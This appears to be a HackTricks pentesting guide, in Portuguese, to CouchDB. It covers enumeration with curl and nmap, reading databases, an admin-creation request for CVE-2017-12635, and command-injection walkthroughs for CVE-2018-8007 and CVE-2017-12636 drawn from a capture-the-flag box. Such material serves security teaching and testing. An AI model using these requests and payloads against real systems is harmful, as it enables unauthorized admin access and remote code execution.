# 5984,6984 - Pentesting CouchDB

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informa√ß√µes B√°sicas**

**CouchDB** √© um **banco de dados orientado a documentos** vers√°til e poderoso que organiza dados usando uma estrutura de **mapa chave-valor** dentro de cada **documento**. Os campos dentro do documento podem ser representados como **pares chave/valor, listas ou mapas**, proporcionando flexibilidade no armazenamento e recupera√ß√£o de dados.

Cada **documento** armazenado no CouchDB √© atribu√≠do a um **identificador √∫nico** (`_id`) no n√≠vel do documento. Al√©m disso, cada modifica√ß√£o feita e salva no banco de dados √© atribu√≠da a um **n√∫mero de revis√£o** (`_rev`). Esse n√∫mero de revis√£o permite um **rastreamento e gerenciamento eficientes de mudan√ßas**, facilitando a recupera√ß√£o e sincroniza√ß√£o de dados dentro do banco de dados.

**Porta padr√£o:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **Enumera√ß√£o Autom√°tica**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## Enumera√ß√£o Manual

### Banner
```
curl http://IP:5984/
```
Isso emite uma solicita√ß√£o GET para a inst√¢ncia do CouchDB instalada. A resposta deve parecer algo como uma das seguintes:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
Note que se ao acessar a raiz do couchdb voc√™ receber um `401 Unauthorized` com algo como: `{"error":"unauthorized","reason":"Authentication required."}` **voc√™ n√£o poder√° acessar** o banner ou qualquer outro endpoint.
{% endhint %}

### Info Enumeration

Estes s√£o os endpoints onde voc√™ pode acessar com uma **GET** request e extrair algumas informa√ß√µes interessantes. Voc√™ pode encontrar [**mais endpoints e descri√ß√µes mais detalhadas na documenta√ß√£o do couchdb**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** Lista de tarefas em execu√ß√£o, incluindo o tipo de tarefa, nome, status e ID do processo.
* **`/_all_dbs`** Retorna uma lista de todos os bancos de dados na inst√¢ncia CouchDB.
* **`/_cluster_setup`** Retorna o status do n√≥ ou cluster, conforme o assistente de configura√ß√£o do cluster.
* **`/_db_updates`** Retorna uma lista de todos os eventos de banco de dados na inst√¢ncia CouchDB. A exist√™ncia do banco de dados `_global_changes` √© necess√°ria para usar este endpoint.
* **`/_membership`** Exibe os n√≥s que fazem parte do cluster como `cluster_nodes`. O campo `all_nodes` exibe todos os n√≥s que este n√≥ conhece, incluindo os que fazem parte do cluster.
* **`/_scheduler/jobs`** Lista de trabalhos de replica√ß√£o. Cada descri√ß√£o de trabalho incluir√° informa√ß√µes de origem e destino, ID de replica√ß√£o, um hist√≥rico de eventos recentes e algumas outras coisas.
* **`/_scheduler/docs`** Lista de estados de documentos de replica√ß√£o. Inclui informa√ß√µes sobre todos os documentos, mesmo nos estados `completed` e `failed`. Para cada documento, retorna o ID do documento, o banco de dados, o ID de replica√ß√£o, origem e destino, e outras informa√ß√µes.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** O endpoint `/_node/{node-name}` pode ser usado para confirmar o nome do n√≥ Erlang do servidor que processa a solicita√ß√£o. Isso √© mais √∫til ao acessar `/_node/_local` para recuperar essa informa√ß√£o.
* **`/_node/{node-name}/_stats`** O recurso `_stats` retorna um objeto JSON contendo as estat√≠sticas do servidor em execu√ß√£o. A string literal `_local` serve como um alias para o nome do n√≥ local, ent√£o para todas as URLs de stats, `{node-name}` pode ser substitu√≠do por `_local`, para interagir com as estat√≠sticas do n√≥ local.
* **`/_node/{node-name}/_system`** O recurso \_system retorna um objeto JSON contendo v√°rias estat√≠sticas de n√≠vel de sistema para o servidor em execu√ß√£o\_.\_ Voc√™ pode usar \_\_`_local` como {node-name} para obter informa√ß√µes do n√≥ atual.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Confirma que o servidor est√° ativo, em execu√ß√£o e pronto para responder a solicita√ß√µes. Se [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) for `true` ou `nolb`, o endpoint retornar√° uma resposta 404.
* **`/_uuids`** Solicita um ou mais Identificadores √önicos Universais (UUIDs) da inst√¢ncia CouchDB.
* **`/_reshard`** Retorna uma contagem de trabalhos conclu√≠dos, falhados, em execu√ß√£o, parados e totais, juntamente com o estado de redistribui√ß√£o no cluster.

Mais informa√ß√µes interessantes podem ser extra√≠das conforme explicado aqui: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Database List**
```
curl -X GET http://IP:5984/_all_dbs
```
Se essa solicita√ß√£o **responder com um 401 n√£o autorizado**, ent√£o voc√™ precisa de algumas **credenciais v√°lidas** para acessar o banco de dados:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
Para encontrar Credenciais v√°lidas, voc√™ poderia **tentar** [**fazer brute force no servi√ßo**](../generic-methodologies-and-resources/brute-force.md#couchdb).

Este √© um **exemplo** de uma **resposta** do couchdb quando voc√™ tem **privilegios suficientes** para listar bancos de dados (√â apenas uma lista de dbs):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Database Info

Voc√™ pode obter algumas informa√ß√µes do banco de dados (como n√∫mero de arquivos e tamanhos) acessando o nome do banco de dados:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Lista de Documentos**

Liste cada entrada dentro de um banco de dados
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Ler Documento**

Leia o conte√∫do de um documento dentro de um banco de dados:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB Privilege Escalation [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Gra√ßas √†s diferen√ßas entre os analisadores JSON do Erlang e do JavaScript, voc√™ poderia **criar um usu√°rio administrador** com as credenciais `hacktricks:hacktricks` com a seguinte solicita√ß√£o:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Mais informa√ß√µes sobre esta vulnerabilidade aqui**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **Vis√£o Geral da Seguran√ßa do Cookie Erlang**

Exemplo [daqui](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Na documenta√ß√£o do CouchDB, especificamente na se√ß√£o sobre configura√ß√£o de cluster ([link](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), discute-se o uso de portas pelo CouchDB em modo de cluster. √â mencionado que, assim como no modo aut√¥nomo, a porta `5984` √© utilizada. Al√©m disso, a porta `5986` √© para APIs locais do n√≥ e, o mais importante, o Erlang requer a porta TCP `4369` para o Daemon do Mapeador de Portas Erlang (EPMD), facilitando a comunica√ß√£o entre n√≥s dentro de um cluster Erlang. Essa configura√ß√£o forma uma rede onde cada n√≥ est√° interligado a todos os outros n√≥s.

Um aviso de seguran√ßa crucial √© destacado em rela√ß√£o √† porta `4369`. Se esta porta for tornada acess√≠vel pela Internet ou por qualquer rede n√£o confi√°vel, a seguran√ßa do sistema depende fortemente de um identificador √∫nico conhecido como "cookie." Este cookie atua como uma salvaguarda. Por exemplo, em uma lista de processos dada, o cookie nomeado "monster" pode ser observado, indicando seu papel operacional na estrutura de seguran√ßa do sistema.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
Para aqueles interessados em entender como esse "cookie" pode ser explorado para Execu√ß√£o Remota de C√≥digo (RCE) no contexto de sistemas Erlang, uma se√ß√£o dedicada est√° dispon√≠vel para leitura adicional. Ela detalha as metodologias para aproveitar cookies Erlang de maneiras n√£o autorizadas para obter controle sobre os sistemas. Voc√™ pode **[explorar o guia detalhado sobre o abuso de cookies Erlang para RCE aqui](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **Explorando CVE-2018-8007 atrav√©s da Modifica√ß√£o de local.ini**

Exemplo [daqui](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Uma vulnerabilidade recentemente divulgada, CVE-2018-8007, que afeta o Apache CouchDB, foi explorada, revelando que a explora√ß√£o requer permiss√µes de escrita no arquivo `local.ini`. Embora n√£o seja diretamente aplic√°vel ao sistema alvo inicial devido a restri√ß√µes de seguran√ßa, modifica√ß√µes foram feitas para conceder acesso de escrita ao arquivo `local.ini` para fins de explora√ß√£o. Passos detalhados e exemplos de c√≥digo s√£o fornecidos abaixo, demonstrando o processo.

Primeiro, o ambiente √© preparado garantindo que o arquivo `local.ini` seja grav√°vel, verificado listando as permiss√µes:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Para explorar a vulnerabilidade, um comando curl √© executado, direcionando a configura√ß√£o `cors/origins` em `local.ini`. Isso injeta uma nova origem juntamente com comandos adicionais na se√ß√£o `[os_daemons]`, com o objetivo de executar c√≥digo arbitr√°rio:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
A verifica√ß√£o subsequente mostra a configura√ß√£o injetada em `local.ini`, contrastando-a com um backup para destacar as mudan√ßas:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
Inicialmente, o arquivo esperado (`/tmp/0xdf`) n√£o existe, indicando que o comando injetado ainda n√£o foi executado. Investiga√ß√µes adicionais revelam que processos relacionados ao CouchDB est√£o em execu√ß√£o, incluindo um que pode potencialmente executar o comando injetado:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
Ao encerrar o processo CouchDB identificado e permitir que o sistema o reinicie automaticamente, a execu√ß√£o do comando injetado √© acionada, confirmada pela exist√™ncia do arquivo anteriormente ausente:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
Esta explora√ß√£o confirma a viabilidade da explora√ß√£o do CVE-2018-8007 sob condi√ß√µes espec√≠ficas, notavelmente a exig√™ncia de acesso grav√°vel ao arquivo `local.ini`. Os exemplos de c√≥digo fornecidos e os passos procedimentais oferecem um guia claro para replicar a explora√ß√£o em um ambiente controlado.

Para mais detalhes sobre o CVE-2018-8007, consulte o aviso da mdsec: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **Explorando o CVE-2017-12636 com Permiss√µes de Grava√ß√£o no local.ini**

Exemplo [daqui](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Uma vulnerabilidade conhecida como CVE-2017-12636 foi explorada, que permite a execu√ß√£o de c√≥digo via o processo CouchDB, embora configura√ß√µes espec√≠ficas possam impedir sua explora√ß√£o. Apesar de numerosas refer√™ncias de Prova de Conceito (POC) dispon√≠veis online, ajustes s√£o necess√°rios para explorar a vulnerabilidade na vers√£o 2 do CouchDB, diferindo da vers√£o 1.x, comumente visada. Os passos iniciais envolvem verificar a vers√£o do CouchDB e confirmar a aus√™ncia do caminho esperado dos servidores de consulta:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
Para acomodar a vers√£o 2.0 do CouchDB, um novo caminho √© utilizado:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
As tentativas de adicionar e invocar um novo servidor de consulta foram encontradas com erros relacionados a permiss√µes, conforme indicado pela seguinte sa√≠da:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Uma investiga√ß√£o mais aprofundada revelou problemas de permiss√£o com o arquivo `local.ini`, que n√£o era grav√°vel. Ao modificar as permiss√µes do arquivo com acesso root ou homer, tornou-se poss√≠vel prosseguir:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
As tentativas subsequentes de adicionar o servidor de consulta foram bem-sucedidas, como demonstrado pela aus√™ncia de mensagens de erro na resposta. A modifica√ß√£o bem-sucedida do arquivo `local.ini` foi confirmada por meio da compara√ß√£o de arquivos:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
O processo continuou com a cria√ß√£o de um banco de dados e um documento, seguido por uma tentativa de executar c√≥digo atrav√©s de um mapeamento de visualiza√ß√£o personalizado para o novo servidor de consulta adicionado:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
Um **[resumo](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** com uma carga √∫til alternativa fornece mais informa√ß√µes sobre a explora√ß√£o da CVE-2017-12636 sob condi√ß√µes espec√≠ficas. **Recursos √∫teis** para explorar essa vulnerabilidade incluem:

- [C√≥digo de explora√ß√£o POC](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Entrada na Exploit Database](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## Refer√™ncias

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
